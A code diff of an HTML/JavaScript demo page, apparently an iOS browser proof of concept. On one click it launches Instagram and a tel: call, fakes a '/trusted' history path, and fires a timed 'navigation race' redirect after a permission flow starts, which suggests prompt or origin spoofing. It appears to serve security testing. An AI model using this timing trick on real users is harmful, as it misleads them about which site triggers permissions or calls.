@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>iOS Open App + Tel + Navigation</title>
+  <title>iOS All-in-One Demo</title>
   <style>
     #panel {
       display: none;
@@ -17,60 +17,51 @@
 </head>
 <body>
 
-<h2>Demo iOS: Open Instagram + Telepon + Navigation Race</h2>
+<h2>Demo iOS: Semua Aksi Sekali Klik</h2>
 
-<button id="openBtn">Buka Instagram & Telepon</button>
-<button id="trigger">Trigger Panel & Navigation Race</button>
-
+<button id="allBtn">Lakukan Semua Aksi</button>
 <p id="status"></p>
 <div id="panel">Panel Terbuka!</div>
 
 <script>
-// ----- Bagian 1: Open Instagram & Tel -----
-function openInstagramAndCall() {
-  const status = document.getElementById("status");
+const allBtn = document.getElementById('allBtn');
+const panel = document.getElementById('panel');
+const status = document.getElementById('status');
+
+allBtn.onclick = () => {
   const phoneNumber = "+6281234567890"; // ganti sesuai nomor
 
+  // --- Step 1: Buka Instagram ---
   status.innerText = "Mencoba membuka Instagram…";
-
   const start = Date.now();
   window.location = "instagram://app";
 
+  // --- Step 2: Delay untuk tel ---
   setTimeout(() => {
     status.innerText = `Mencoba menelpon ${phoneNumber}…`;
     window.location.href = `tel:${phoneNumber}`;
 
     setTimeout(() => {
-      status.innerText = `Jika Instagram tidak terbuka atau panggilan tidak muncul, pastikan aplikasi dan panggilan didukung.`;
+      status.innerText = "Instagram atau panggilan mungkin tidak muncul, pastikan perangkat mendukung.";
     }, 1000);
 
-  }, 1000); // delay sebelum tel:
-}
+  }, 1000);
 
-document.getElementById("openBtn").onclick = openInstagramAndCall;
-
-// ----- Bagian 2: Trigger Panel + Navigation Race -----
-const trigger = document.getElementById('trigger');
-const panel = document.getElementById('panel');
-
-trigger.onclick = () => {
+  // --- Step 3: PushState + tampilkan panel ---
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
-};
 
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
+  // --- Step 4: Navigation race (redirect) ---
+  window.addEventListener('pageshow', () => {
     requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
+      requestAnimationFrame(() => {
+        setTimeout(() => {
+          location.href = 'https://google.com:9090';
+        }, 80);
+      });
     });
   });
-});
+};
 </script>
 
 </body>
